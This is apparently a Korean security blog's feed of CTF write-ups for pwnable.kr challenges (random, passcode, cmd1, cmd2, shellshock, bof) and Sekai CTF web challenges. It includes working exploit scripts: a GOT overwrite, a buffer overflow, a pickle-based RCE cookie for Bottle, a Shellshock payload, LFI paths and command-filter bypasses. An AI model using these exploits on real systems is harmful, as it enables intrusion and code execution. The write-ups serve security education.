0x0000000000400609 \u0026lt;+21\u0026gt;:\tmov DWORD PTR [rbp-0x8],0x0 0x0000000000400610 \u0026lt;+28\u0026gt;:\tmov eax,0x400760 0x0000000000400615 \u0026lt;+33\u0026gt;:\tlea rdx,[rbp-0x8] 0x0000000000400619 \u0026lt;+37\u0026gt;:\tmov rsi,rdx 0x000000000040061c \u0026lt;+40\u0026gt;:\tmov rdi,rax 0x000000000040061f \u0026lt;+43\u0026gt;:\tmov eax,0x0 0x0000000000400624 \u0026lt;+48\u0026gt;:\tcall 0x4004f0 \u0026lt;__isoc99_scanf@plt\u0026gt; 0x0000000000400629 \u0026lt;+53\u0026gt;:\tmov eax,DWORD PTR [rbp-0x8] 0x000000000040062c \u0026lt;+56\u0026gt;:\txor eax,DWORD PTR [rbp-0x4] 0x000000000040062f \u0026lt;+59\u0026gt;:\tcmp eax,0xdeadbeef 0x0000000000400634 \u0026lt;+64\u0026gt;:\tjne 0x400656 \u0026lt;main+98\u0026gt; 0x0000000000400636 \u0026lt;+66\u0026gt;:\tmov edi,0x400763 0x000000000040063b \u0026lt;+71\u0026gt;:\tcall 0x4004c0 \u0026lt;puts@plt\u0026gt; 0x0000000000400640 \u0026lt;+76\u0026gt;:\tmov edi,0x400769 0x0000000000400645 \u0026lt;+81\u0026gt;:\tmov eax,0x0 0x000000000040064a \u0026lt;+86\u0026gt;:\tcall 0x4004d0 \u0026lt;system@plt\u0026gt; 0x000000000040064f \u0026lt;+91\u0026gt;:\tmov eax,0x0 0x0000000000400654 \u0026lt;+96\u0026gt;:\tjmp 0x400665 \u0026lt;main+113\u0026gt; 0x0000000000400656 \u0026lt;+98\u0026gt;:\tmov edi,0x400778 0x000000000040065b \u0026lt;+103\u0026gt;:\tcall 0x4004c0 \u0026lt;puts@plt\u0026gt; 0x0000000000400660 \u0026lt;+108\u0026gt;:\tmov eax,0x0 0x0000000000400665 \u0026lt;+113\u0026gt;:\tleave 0x0000000000400666 \u0026lt;+114\u0026gt;:\tret End of assembler dump. 해당 지점에서 bp를 잡고 할당된 값을 보면 0x6b8b4567 값이 고정되서 들어가는 것을 알 수 있다. 즉 0x6b8b4567과 0xdeadbeef를 xor연산하여 대입하면 flag를 획득할 수 있다는 것이다.\n(gdb) b *main+18 Breakpoint 1 at 0x400606 (gdb) r Starting program: /home/random/random Breakpoint 1, 0x0000000000400606 in main () (gdb) info register $eax eax 0x6b8b4567\t1804289383 이를 기반으로 아래 코드를 작성하여 flag를 획득 할 수 있었다.\nfrom pwn import * rand = 0x6b8b4567 deadbeef = 0xdeadbeef payload = str(deadbeef ^ rand) s = ssh(\u0026#39;random\u0026#39;,\u0026#39;pwnable.kr\u0026#39;,password=\u0026#39;guest\u0026#39;,port=2222) p = s.process(\u0026#39;./random\u0026#39;) p.sendline(payload) p.interactive()  python3 ./pwnable.kr_random.py [+] Connecting to pwnable.kr on port 2222: Done [*] passcode@pwnable.kr: Distro Ubuntu 16.04 OS: linux Arch: amd64 Version: 4.4.179 ASLR: Enabled [+] Starting remote process bytearray(b'./random') on pwnable.kr: pid 59043 [*] Switching to interactive mode Good! Mommy, I thought libc random is unpredictable... ","date":"2022-10-25T09:55:13+09:00","image":"https://appealso.github.io/p/pwnable.kr-random/pwn_hu894f602aab8ef4f7b7afefcfbc650dba_71661_120x120_fill_box_smart1_3.png","permalink":"https://appealso.github.io/p/pwnable.kr-random/","title":"pwnable.kr random"},{"content":"접속을 하면 아래와 같은 링크가 주어진다.\n ssh passcode@pwnable.kr -p2222  ls를 쳐보면 아래와 같이 3가지 파일이 주어지는 c 파일을 먼저 열어 보았다.\npasscode@pwnable:~$ ls flag passcode\tpasscode.c // passcode.c #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt; void login(){ int passcode1; int passcode2; printf(\u0026#34;enter passcode1 : \u0026#34;); scanf(\u0026#34;%d\u0026#34;, passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) \tprintf(\u0026#34;enter passcode2 : \u0026#34;); scanf(\u0026#34;%d\u0026#34;, passcode2); printf(\u0026#34;checking...\\n\u0026#34;); if(passcode1==338150 \u0026amp;\u0026amp; passcode2==13371337){ printf(\u0026#34;Login OK!\\n\u0026#34;); system(\u0026#34;/bin/cat flag\u0026#34;); } else{ printf(\u0026#34;Login Failed!\\n\u0026#34;); exit(0); } } void welcome(){ char name[100]; printf(\u0026#34;enter you name : \u0026#34;); scanf(\u0026#34;%100s\u0026#34;, name); printf(\u0026#34;Welcome %s!\\n\u0026#34;, name); } int main(){ printf(\u0026#34;Toddler\u0026#39;s Secure Login System 1.0 beta.\\n\u0026#34;); welcome(); login(); // something after login... \tprintf(\u0026#34;Now I can safely trust you that you have credential :)\\n\u0026#34;); return 0; } 여기서 확인 할 수 있는 것은 \u0026amp; 표시가 없어 정상적인 값 입력이 불가능한 상태였다. ex) \u0026amp;passcode1 와 같은 형식으로 받아야함\n또한 입력받을때 취약한 함수를 사용하여 버퍼 오버 플로우가 가능하다고 생각이 들었다. 다음으로 어셈블리 코드를 열어보았다.\n(gdb) disas login Dump of assembler code for function login: 0x08048564 \u0026lt;+0\u0026gt;:\tpush ebp 0x08048565 \u0026lt;+1\u0026gt;:\tmov ebp,esp 0x08048567 \u0026lt;+3\u0026gt;:\tsub esp,0x28 0x0804856a \u0026lt;+6\u0026gt;:\tmov eax,0x8048770 0x0804856f \u0026lt;+11\u0026gt;:\tmov DWORD PTR [esp],eax 0x08048572 \u0026lt;+14\u0026gt;:\tcall 0x8048420 \u0026lt;printf@plt\u0026gt; 0x08048577 \u0026lt;+19\u0026gt;:\tmov eax,0x8048783 0x0804857c \u0026lt;+24\u0026gt;:\tmov edx,DWORD PTR [ebp-0x10] // passcode1 저장위치 0x0804857f \u0026lt;+27\u0026gt;:\tmov DWORD PTR [esp+0x4],edx 0x08048583 \u0026lt;+31\u0026gt;:\tmov DWORD PTR [esp],eax 0x08048586 \u0026lt;+34\u0026gt;:\tcall 0x80484a0 \u0026lt;__isoc99_scanf@plt\u0026gt; 0x0804858b \u0026lt;+39\u0026gt;:\tmov eax,ds:0x804a02c 0x08048590 \u0026lt;+44\u0026gt;:\tmov DWORD PTR [esp],eax 0x08048593 \u0026lt;+47\u0026gt;:\tcall 0x8048430 \u0026lt;fflush@plt\u0026gt; 0x08048598 \u0026lt;+52\u0026gt;:\tmov eax,0x8048786 0x0804859d \u0026lt;+57\u0026gt;:\tmov DWORD PTR [esp],eax 0x080485a0 \u0026lt;+60\u0026gt;:\tcall 0x8048420 \u0026lt;printf@plt\u0026gt; 0x080485a5 \u0026lt;+65\u0026gt;:\tmov eax,0x8048783 0x080485aa \u0026lt;+70\u0026gt;:\tmov edx,DWORD PTR [ebp-0xc] // passcode2 저장 위치 0x080485ad \u0026lt;+73\u0026gt;:\tmov DWORD PTR [esp+0x4],edx 0x080485b1 \u0026lt;+77\u0026gt;:\tmov DWORD PTR [esp],eax 0x080485b4 \u0026lt;+80\u0026gt;:\tcall 0x80484a0 \u0026lt;__isoc99_scanf@plt\u0026gt; 0x080485b9 \u0026lt;+85\u0026gt;:\tmov DWORD PTR [esp],0x8048799 0x080485c0 \u0026lt;+92\u0026gt;:\tcall 0x8048450 \u0026lt;puts@plt\u0026gt; 0x080485c5 \u0026lt;+97\u0026gt;:\tcmp DWORD PTR [ebp-0x10],0x528e6 0x080485cc \u0026lt;+104\u0026gt;:\tjne 0x80485f1 \u0026lt;login+141\u0026gt; 0x080485ce \u0026lt;+106\u0026gt;:\tcmp DWORD PTR [ebp-0xc],0xcc07c9 0x080485d5 \u0026lt;+113\u0026gt;:\tjne 0x80485f1 \u0026lt;login+141\u0026gt; 0x080485d7 \u0026lt;+115\u0026gt;:\tmov DWORD PTR [esp],0x80487a5 0x080485de \u0026lt;+122\u0026gt;:\tcall 0x8048450 \u0026lt;puts@plt\u0026gt; 0x080485e3 \u0026lt;+127\u0026gt;:\tmov DWORD PTR [esp],0x80487af 0x080485ea \u0026lt;+134\u0026gt;:\tcall 0x8048460 \u0026lt;system@plt\u0026gt; 0x080485ef \u0026lt;+139\u0026gt;:\tleave 0x080485f0 \u0026lt;+140\u0026gt;:\tret 0x080485f1 \u0026lt;+141\u0026gt;:\tmov DWORD PTR [esp],0x80487bd 0x080485f8 \u0026lt;+148\u0026gt;:\tcall 0x8048450 \u0026lt;puts@plt\u0026gt; 0x080485fd \u0026lt;+153\u0026gt;:\tmov DWORD PTR [esp],0x0 0x08048604 \u0026lt;+160\u0026gt;:\tcall 0x8048480 \u0026lt;exit@plt\u0026gt; End of assembler dump. (gdb) disas welcome Dump of assembler code for function welcome: 0x08048609 \u0026lt;+0\u0026gt;:\tpush ebp 0x0804860a \u0026lt;+1\u0026gt;:\tmov ebp,esp 0x0804860c \u0026lt;+3\u0026gt;:\tsub esp,0x88 0x08048612 \u0026lt;+9\u0026gt;:\tmov eax,gs:0x14 0x08048618 \u0026lt;+15\u0026gt;:\tmov DWORD PTR [ebp-0xc],eax 0x0804861b \u0026lt;+18\u0026gt;:\txor eax,eax 0x0804861d \u0026lt;+20\u0026gt;:\tmov eax,0x80487cb 0x08048622 \u0026lt;+25\u0026gt;:\tmov DWORD PTR [esp],eax 0x08048625 \u0026lt;+28\u0026gt;:\tcall 0x8048420 \u0026lt;printf@plt\u0026gt; 0x0804862a \u0026lt;+33\u0026gt;:\tmov eax,0x80487dd 0x0804862f \u0026lt;+38\u0026gt;:\tlea edx,[ebp-0x70] //name 저장 위치 0x08048632 \u0026lt;+41\u0026gt;:\tmov DWORD PTR [esp+0x4],edx 0x08048636 \u0026lt;+45\u0026gt;:\tmov DWORD PTR [esp],eax 0x08048639 \u0026lt;+48\u0026gt;:\tcall 0x80484a0 \u0026lt;__isoc99_scanf@plt\u0026gt; 0x0804863e \u0026lt;+53\u0026gt;:\tmov eax,0x80487e3 0x08048643 \u0026lt;+58\u0026gt;:\tlea edx,[ebp-0x70] 0x08048646 \u0026lt;+61\u0026gt;:\tmov DWORD PTR [esp+0x4],edx 0x0804864a \u0026lt;+65\u0026gt;:\tmov DWORD PTR [esp],eax 0x0804864d \u0026lt;+68\u0026gt;:\tcall 0x8048420 \u0026lt;printf@plt\u0026gt; 0x08048652 \u0026lt;+73\u0026gt;:\tmov eax,DWORD PTR [ebp-0xc] 0x08048655 \u0026lt;+76\u0026gt;:\txor eax,DWORD PTR gs:0x14 0x0804865c \u0026lt;+83\u0026gt;:\tje 0x8048663 \u0026lt;welcome+90\u0026gt; 0x0804865e \u0026lt;+85\u0026gt;:\tcall 0x8048440 \u0026lt;__stack_chk_fail@plt\u0026gt; 0x08048663 \u0026lt;+90\u0026gt;:\tleave 0x08048664 \u0026lt;+91\u0026gt;:\tret End of assembler dump. 코드를 살펴보면 passcode1을 [ebp-0x10]에 저장하고, name을 [ebp-0x70]에 저장하는 것을 알 수 있다.\n함수가 다르지만 하나의 코드이기 때문에 stack영역을 공유한다.\nname배열을 선언할떄 100byte를 주고 선언을 한다. 하지만 0x70과 0x10 사이의 거리를 알아보면 0x70 - 0x10 = 0x60 ( 96byte ) 으로 4byte가 남게 된다. 우리는 이 부분을 이용해서 exploit을 해야한다. 여기서는 fflush를 이용해야 한다. fflush는 got함수를 이용해서 자신을 호출하는데 이 부분을 조작해 우리가 원하는 함수를 실행시킬 수 있다.\n아래의 코드에서 flush의 got 주소가 0x804a004 인것을 획득 할 수 있다.\n(gdb) x/i 0x8048430 0x8048430 \u0026lt;fflush@plt\u0026gt;:\tjmp DWORD PTR ds:0x804a004 (gdb) x/i 0x804a004 0x804a004 \u0026lt;fflush@got.plt\u0026gt;:\ttest BYTE PTR ss:[eax+ecx*1],al 그리고 login 어셈블리 코드상에서 0x080485e3가 system(\u0026quot;/bin/cat flag\u0026quot;);의 주소인것을 알 수 있다.\n 0x080485e3 \u0026lt;+127\u0026gt;:\tmov DWORD PTR [esp],0x80487af 0x080485ea \u0026lt;+134\u0026gt;:\tcall 0x8048460 \u0026lt;system@plt\u0026gt; 정리를 하면 아래와 같다.\n name 배열 끝 4 bytes가 passcode1의 주소와 겹친다. name 배열 끝 4 bytes를 fflush 함수의 GOT 테이블의 주소로 입력한다. ( = passcode1가 fflush 함수의 GOT가 됨) scanf를 통해 passcode1, 즉 fflush 함수의 GOT를 조작한다. system 함수의 시작으로 덮어쓴다! Exploit!  이를 토대로 exploit 코드를 작성하면 아래와 같다.\nfrom pwn import * fflush_got = 0x804a004 flag_address = 0x080485e3 payload = b\u0026#39;A\u0026#39;*96 payload += p32(fflush_got) payload2 = str(int(flag_address)) # 10진수로 입력을 받아서 변환 필요. s = ssh(\u0026#39;passcode\u0026#39;,\u0026#39;pwnable.kr\u0026#39;,password=\u0026#39;guest\u0026#39;,port=2222) p = s.process(\u0026#39;./passcode\u0026#39;) p.sendline(payload) p.sendline(payload2) p.interactive() 위에 코드 실행 후 flag를 획득할 수 있었다.\n python3 ./pwnable.kr_passcode.py [+] Connecting to pwnable.kr on port 2222: Done [*] passcode@pwnable.kr: Distro Ubuntu 16.04 OS: linux Arch: amd64 Version: 4.4.179 ASLR: Enabled [+] Starting remote process bytearray(b\u0026#39;./passcode\u0026#39;) on pwnable.kr: pid 338194 ./pwnable.kr_bof.py:15: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes p.sendline(payload2) [*] Switching to interactive mode Toddler\u0026#39;s Secure Login System 1.0 beta. enter you name : $ $ Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x04\\x04! enter passcode1 : Sorry mom.. I got confused about scanf usage :( Now I can safely trust you that you have credential :) [*] Got EOF while reading in interactive 참고 https://powerco3e-lch.tistory.com/20\nhttps://blackperl-security.gitlab.io/blog/2016/03/07/2016-03-07-pltgot-01/\n","date":"2022-10-24T10:57:54+09:00","image":"https://appealso.github.io/p/pwnable.kr-passcode/pwn_hu894f602aab8ef4f7b7afefcfbc650dba_71661_120x120_fill_box_smart1_3.png","permalink":"https://appealso.github.io/p/pwnable.kr-passcode/","title":"pwnable.kr passcode"},{"content":"문제를 접속하면 아래의 php 코드가 주어진다. 해당 코드를 해석해보면 GET 방식으로 sekai_game.run을 실행하면 될 것으로 보였다.\n\u0026lt;?php include(\u0026#39;./flag.php\u0026#39;); class Sekai_Game{ public $start = True; public function __destruct(){ if($this-\u0026gt;start === True){ echo \u0026#34;Sekai Game Start Here is your flag \u0026#34;.getenv(\u0026#39;FLAG\u0026#39;); } } public function __wakeup(){ $this-\u0026gt;start=False; } } if(isset($_GET[\u0026#39;sekai_game.run\u0026#39;])){ unserialize($_GET[\u0026#39;sekai_game.run\u0026#39;]); }else{ highlight_file(__FILE__); } ?\u0026gt;하지만 sekai_game.run을 GET 방식으로 요청할 경우 \u0026ldquo;.\u0026ldquo;을 \u0026ldquo;_\u0026ldquo;로 변경을 해버린다. 이것을 우회하기 위해 \u0026ldquo;_\u0026ldquo;를 사용하는 대신에 \u0026ldquo;[\u0026rdquo; (대괄호)를 넣어서 우회를 해야 한다.\n write-up을 보다보니 php의 8버전이전의 경우 대활호를 만나면 대괄호를 \u0026ldquo;_\u0026rdquo; (언더바)로 변경하고 나머지는 변경을 하지 않는다고 한다.  이제 다음 문제는 Sekai_Game Class 에서 wake_up 함수를 우회해야한다. 이를 위해 관련 문서를 찾아 보았고, ?sekai[game.run=C:10:\u0026ldquo;Sekai_Game\u0026rdquo;:0:{} 과 같은 POC코드를 작성 할 수 있었다.\n 참고: https://bugs.php.net/bug.php?id=81151  작성한 코드를 실행하면 아래와 같은 화면이 나오면서 flag를 획득 할 수 있다.\nWarning: Insufficient data for unserializing - 1 required, 1 present in /var/www/html/index.php on line 17 Sekai Game Start Here is your flag SEKAI{W3lcome_T0_Our_universe} ","date":"2022-10-22T19:30:27+09:00","image":"https://appealso.github.io/p/sekai-ctf-sekai-game-start/sekaictf_hu2550f7ad8b351e6fa8038bce33594268_150813_120x120_fill_box_smart1_3.png","permalink":"https://appealso.github.io/p/sekai-ctf-sekai-game-start/","title":"Sekai CTF sekai-game-start"},{"content":"Write Up 문제를 접속하면 아래와 같은 페이지가 나온다.\n sekai \n링크들을 클릭해보면 아래와 같은 URL로 이동이 되면서 시가 나오는 페이지로 이동이 된다. 해당 링크에서 LFI공격이 가능하다고 생각이 들었고 공격이 가능했다.\nhttp://localhost:8081/show?id=spring.txt LFI를 통해 앱이 실행되고 있는 페이지로 이동을 하면 아래와 같은 소스를 확인 할 수 있다.\n \u0026lsquo;/proc/self/cwd\u0026rsquo;는 현재 실행중인 프로세스의 디렉토리 표시하는 명령어다.  URL: http://localhost:8081/show?id=/proc/self/cwd/app.py from bottle import route, run, template, request, response, error from config.secret import sekai import os import re @route(\u0026#34;/\u0026#34;) def home(): return template(\u0026#34;index\u0026#34;) @route(\u0026#34;/show\u0026#34;) def index(): response.content_type = \u0026#34;text/plain; charset=UTF-8\u0026#34; param = request.query.id if re.search(\u0026#34;^../app\u0026#34;, param): return \u0026#34;No!!!!\u0026#34; requested_path = os.path.join(os.getcwd() + \u0026#34;/poems\u0026#34;, param) try: with open(requested_path) as f: tfile = f.read() except Exception as e: return \u0026#34;No This Poems\u0026#34; return tfile @error(404) def error404(error): return template(\u0026#34;error\u0026#34;) @route(\u0026#34;/sign\u0026#34;) def index(): try: session = request.get_cookie(\u0026#34;name\u0026#34;, secret=sekai) if not session or session[\u0026#34;name\u0026#34;] == \u0026#34;guest\u0026#34;: session = {\u0026#34;name\u0026#34;: \u0026#34;guest\u0026#34;} response.set_cookie(\u0026#34;name\u0026#34;, session, secret=sekai) return template(\u0026#34;guest\u0026#34;, name=session[\u0026#34;name\u0026#34;]) if session[\u0026#34;name\u0026#34;] == \u0026#34;admin\u0026#34;: return template(\u0026#34;admin\u0026#34;, name=session[\u0026#34;name\u0026#34;]) except: return \u0026#34;pls no hax\u0026#34; if __name__ == \u0026#34;__main__\u0026#34;: os.chdir(os.path.dirname(__file__)) run(host=\u0026#34;0.0.0.0\u0026#34;, port=8080) 해당 소스를 보면 secret.py파일에서 sekai를 불러오는 것으로 보았을때 session에 사용되는 secret값을 추출하는 것을 추측할 수 있고, Python Bottle 프레임워크를 사용하는 것을 알 수 있다.\nURL: http://localhost:8081/show?id=/proc/self/cwd/config/secret.py sekai = \u0026#34;Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu\u0026#34; bottle 프레임워크 관련 문서를 검색해보면 RCE가 가능한것으로 확인이 되는데. bottle.py에서 사용되는 cookie 값을 가지고 RCE가 가능한것을 알 수 있다.\n https://github.com/bottlepy/bottle/issues/900  def cookie_encode(data, key, digestmod=None): \u0026#34;\u0026#34;\u0026#34; Encode and sign a pickle-able object. Return a (byte) string \u0026#34;\u0026#34;\u0026#34; depr(0, 13, \u0026#34;cookie_encode() will be removed soon.\u0026#34;, \u0026#34;Do not use this API directly.\u0026#34;) digestmod = digestmod or hashlib.sha256 msg = base64.b64encode(pickle.dumps(data, -1)) sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=digestmod).digest()) return tob(\u0026#39;!\u0026#39;) + sig + tob(\u0026#39;?\u0026#39;) + msg cookie_encode 코드를 가지고 exploit을 하면 flag를 txt로 생성하고, 해당 페이지에 접근하면 flag를 획득할 수 있다.\nimport os, hmac, hashlib, base64, pickle, requests def tob(s, enc=\u0026#39;utf8\u0026#39;): if isinstance(s, str): return s.encode(enc) return b\u0026#39;\u0026#39; if s is None else bytes(s) class RCE(object): def __reduce__(self): import os return (os.system,(\u0026#34;/flag \u0026gt; /dev/shm/sekaiflag.txt\u0026#34;,)) msg = base64.b64encode(pickle.dumps(RCE(), -1)) sig = base64.b64encode(hmac.new(tob(\u0026#34;Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu\u0026#34;), msg, digestmod=hashlib.md5).digest()) payload = \u0026#39;\u0026#34;\u0026#39;+str(tob(\u0026#39;!\u0026#39;) + sig + tob(\u0026#39;?\u0026#39;) + msg).replace(\u0026#34;b\u0026#39;\u0026#34;, \u0026#34;\u0026#34;)[:-1]+\u0026#39;\u0026#34;\u0026#39; r = requests.get(\u0026#34;http://localhost:8081/sign\u0026#34;, cookies={\u0026#34;name\u0026#34;: payload}) URL: http://localhost:8081/show?id=/dev/shm/sekaiflag.txt SEKAI{W3lcome_To_Our_Bottle} 참고 https://aceatom.tistory.com/398\n","date":"2022-10-22T11:23:15+09:00","image":"https://appealso.github.io/p/sekai-ctf-bottle-poem-write-up/sekaictf_hu2550f7ad8b351e6fa8038bce33594268_150813_120x120_fill_box_smart1_3.png","permalink":"https://appealso.github.io/p/sekai-ctf-bottle-poem-write-up/","title":"Sekai CTF Bottle-Poem Write Up"},{"content":"주어진 링크에 접속하여 파일을 확인해보면 아래와 같은 파일이 주어진다. 이중에서 c파일을 열면 아래와 같은 내용을 확인 할 수 있다.\ncmd2@pwnable:~$ ls cmd2 cmd2.c flag cmd2@pwnable:~$ cat cmd2.c #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;string.h\u0026gt; int filter(char* cmd){ int r=0; r += strstr(cmd, \u0026#34;=\u0026#34;)!=0; r += strstr(cmd, \u0026#34;PATH\u0026#34;)!=0; r += strstr(cmd, \u0026#34;export\u0026#34;)!=0; r += strstr(cmd, \u0026#34;/\u0026#34;)!=0; r += strstr(cmd, \u0026#34;`\u0026#34;)!=0; r += strstr(cmd, \u0026#34;flag\u0026#34;)!=0; return r; } extern char** environ; void delete_env(){ char** p; for(p=environ; *p; p++) memset(*p, 0, strlen(*p)); } int main(int argc, char* argv[], char** envp){ delete_env(); putenv(\u0026#34;PATH=/no_command_execution_until_you_become_a_hacker\u0026#34;); if(filter(argv[1])) return 0; printf(\u0026#34;%s\\n\u0026#34;, argv[1]); system( argv[1] ); return 0; } cmd1에서 사용했던 우회방식은 불가하다고 판단이 들었고, 아래와 같은 방식으로 우회하여 flag를 획득할 수 있었다.\ncmd2@pwnable:~$ ./cmd2 \u0026#34;command -p cat fl*\u0026#34; command -p cat fl* FuN_w1th_5h3ll_v4riabl3s_haha ","date":"2022-10-22T10:19:30+09:00","image":"https://appealso.github.io/p/pwnable.kr-cmd2/pwn_hu894f602aab8ef4f7b7afefcfbc650dba_71661_120x120_fill_box_smart1_3.png","permalink":"https://appealso.github.io/p/pwnable.kr-cmd2/","title":"pwnable.kr cmd2"},{"content":"주어진 경로에 접속하면 아래와 같이 3가지 파일이 주어진다. 이 중 C파일을 실행하면 아래와 같은 내용의 소스코드를 확인할 수 있다.\ncmd1@pwnable:~$ ls cmd1 cmd1.c flag cmd1@pwnable:~$ cat cmd1.c #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;string.h\u0026gt; int filter(char* cmd){ int r=0; r += strstr(cmd, \u0026#34;flag\u0026#34;)!=0; r += strstr(cmd, \u0026#34;sh\u0026#34;)!=0; r += strstr(cmd, \u0026#34;tmp\u0026#34;)!=0; return r; } int main(int argc, char* argv[], char** envp){ putenv(\u0026#34;PATH=/thankyouverymuch\u0026#34;); if(filter(argv[1])) return 0; system( argv[1] ); return 0; } 코드를 해석해보면 flag,sh,tmp를 필터링 하지만 특수문자는 필터링하지 못하기에 아래와 같은 방식으로 우회하면 flag를 획득 할 수 있었다.\ncmd1@pwnable:~$ ./cmd1 \u0026#34;/bin/cat fl*\u0026#34; mommy now I get what PATH environment is for :) ","date":"2022-10-22T10:16:43+09:00","image":"https://appealso.github.io/p/pwnable.kr-cmd1/pwn_hu894f602aab8ef4f7b7afefcfbc650dba_71661_120x120_fill_box_smart1_3.png","permalink":"https://appealso.github.io/p/pwnable.kr-cmd1/","title":"pwnable.kr cmd1"},{"content":"주어진 경로에 접속하면 아래와 같은 파일이 주어진다.\nshellshock@pwnable:~$ ls -al total 980 drwxr-x--- 5 root shellshock 4096 Oct 23 2016 . drwxr-xr-x 116 root root 4096 Nov 11 2021 .. -r-xr-xr-x 1 root shellshock 959120 Oct 12 2014 bash d--------- 2 root root 4096 Oct 12 2014 .bash_history -r--r----- 1 root shellshock_pwn 47 Oct 12 2014 flag dr-xr-xr-x 2 root root 4096 Oct 12 2014 .irssi drwxr-xr-x 2 root root 4096 Oct 23 2016 .pwntools-cache -r-xr-sr-x 1 root shellshock_pwn 8547 Oct 12 2014 shellshock -r--r--r-- 1 root root 188 Oct 12 2014 shellshock.c 파일들 중에 보면 shell shock라는 파일을 확인할 수 있고, 소스코드인 c파일을 먼저 실행하면 아래와 같은 내용을 확인 할 수 있다.\nshellshock@pwnable:~$ cat shellshock.c #include \u0026lt;stdio.h\u0026gt;int main(){ setresuid(getegid(), getegid(), getegid()); setresgid(getegid(), getegid(), getegid()); system(\u0026#34;/home/shellshock/bash -c \u0026#39;echo shock_me\u0026#39;\u0026#34;); return 0; } 해당 취약점은 bash의 환경변수와 선언에서 나타는 버그이고, 이를 이용하면 exploit이 가능했다. 공격 구문은 아래와 같다.\n Shell Shock : CVE-2014-6271  shellshock@pwnable:~$ export x=\u0026#39;() { echo hello; }; /bin/cat flag\u0026#39; shellshock@pwnable:~$ ./shellshock only if I knew CVE-2014-6271 ten years ago..!! Segmentation fault (core dumped) ","date":"2022-10-22T10:06:49+09:00","image":"https://appealso.github.io/p/pwnable.kr-shell-shock/pwn_hu894f602aab8ef4f7b7afefcfbc650dba_71661_120x120_fill_box_smart1_3.png","permalink":"https://appealso.github.io/p/pwnable.kr-shell-shock/","title":"pwnable.kr shell shock"},{"content":"해당 문제를 실행하면 아래와 같은 코드가 주어진다.\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;string.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt;void func(int key){ char overflowme[32]; printf(\u0026#34;overflow me : \u0026#34;); gets(overflowme);\t// smash me! \tif(key == 0xcafebabe){ system(\u0026#34;/bin/sh\u0026#34;); } else{ printf(\u0026#34;Nah..\\n\u0026#34;); } } int main(int argc, char* argv[]){ func(0xdeadbeef); return 0; } 코드를 보면 gets라는 취약한 함수를 사용하는 것을 확인할 수 있고, 해당 코드에서 bof 공격이 가능한 것을 확인 할 수 있었다.\npwndbg\u0026gt; disassemble main Dump of assembler code for function main: 0x0000068a \u0026lt;+0\u0026gt;:\tpush ebp 0x0000068b \u0026lt;+1\u0026gt;:\tmov ebp,esp 0x0000068d \u0026lt;+3\u0026gt;:\tand esp,0xfffffff0 0x00000690 \u0026lt;+6\u0026gt;:\tsub esp,0x10 0x00000693 \u0026lt;+9\u0026gt;:\tmov DWORD PTR [esp],0xdeadbeef 0x0000069a \u0026lt;+16\u0026gt;:\tcall 0x62c \u0026lt;func\u0026gt; 0x0000069f \u0026lt;+21\u0026gt;:\tmov eax,0x0 0x000006a4 \u0026lt;+26\u0026gt;:\tleave 0x000006a5 \u0026lt;+27\u0026gt;:\tret End of assembler dump. pwndbg\u0026gt; disassemble func Dump of assembler code for function func: 0x0000062c \u0026lt;+0\u0026gt;:\tpush ebp 0x0000062d \u0026lt;+1\u0026gt;:\tmov ebp,esp 0x0000062f \u0026lt;+3\u0026gt;:\tsub esp,0x48 0x00000632 \u0026lt;+6\u0026gt;:\tmov eax,gs:0x14 0x00000638 \u0026lt;+12\u0026gt;:\tmov DWORD PTR [ebp-0xc],eax 0x0000063b \u0026lt;+15\u0026gt;:\txor eax,eax 0x0000063d \u0026lt;+17\u0026gt;:\tmov DWORD PTR [esp],0x78c 0x00000644 \u0026lt;+24\u0026gt;:\tcall 0x645 \u0026lt;func+25\u0026gt; 0x00000649 \u0026lt;+29\u0026gt;:\tlea eax,[ebp-0x2c] 0x0000064c \u0026lt;+32\u0026gt;:\tmov DWORD PTR [esp],eax 0x0000064f \u0026lt;+35\u0026gt;:\tcall 0x650 \u0026lt;func+36\u0026gt; 0x00000654 \u0026lt;+40\u0026gt;:\tcmp DWORD PTR [ebp+0x8],0xcafebabe 0x0000065b \u0026lt;+47\u0026gt;:\tjne 0x66b \u0026lt;func+63\u0026gt; 0x0000065d \u0026lt;+49\u0026gt;:\tmov DWORD PTR [esp],0x79b 0x00000664 \u0026lt;+56\u0026gt;:\tcall 0x665 \u0026lt;func+57\u0026gt; 0x00000669 \u0026lt;+61\u0026gt;:\tjmp 0x677 \u0026lt;func+75\u0026gt; 0x0000066b \u0026lt;+63\u0026gt;:\tmov DWORD PTR [esp],0x7a3 0x00000672 \u0026lt;+70\u0026gt;:\tcall 0x673 \u0026lt;func+71\u0026gt; 0x00000677 \u0026lt;+75\u0026gt;:\tmov eax,DWORD PTR [ebp-0xc] 0x0000067a \u0026lt;+78\u0026gt;:\txor eax,DWORD PTR gs:0x14 0x00000681 \u0026lt;+85\u0026gt;:\tje 0x688 \u0026lt;func+92\u0026gt; 0x00000683 \u0026lt;+87\u0026gt;:\tcall 0x684 \u0026lt;func+88\u0026gt; 0x00000688 \u0026lt;+92\u0026gt;:\tleave 0x00000689 \u0026lt;+93\u0026gt;:\tret End of assembler dump. pwndbg\u0026gt; gdb를 사용하여 코드를 분석해보면 overflowme 부터 key를 비교하기 전까지 52byte가 차이나는 것을 볼 수 있다. 답을 도출하기 위해 아래와 같은 코드를 작성하여 답을 얻을 수 있었다.\n 0x2c(44) ~ ebp+0x8(8) = 52  from pwn import * r = remote(\u0026#34;pwnable.kr\u0026#34;, 9000) payload = b\u0026#39;A\u0026#39;*52 payload += p32(0xcafebabe) r.send(payload) r.interactive();  python3 ./pwnable.kr_bof.py [+] Opening connection to pwnable.kr on port 9000: Done [*] Switching to interactive mode $ cat flag daddy, I just pwned a buFFer :) 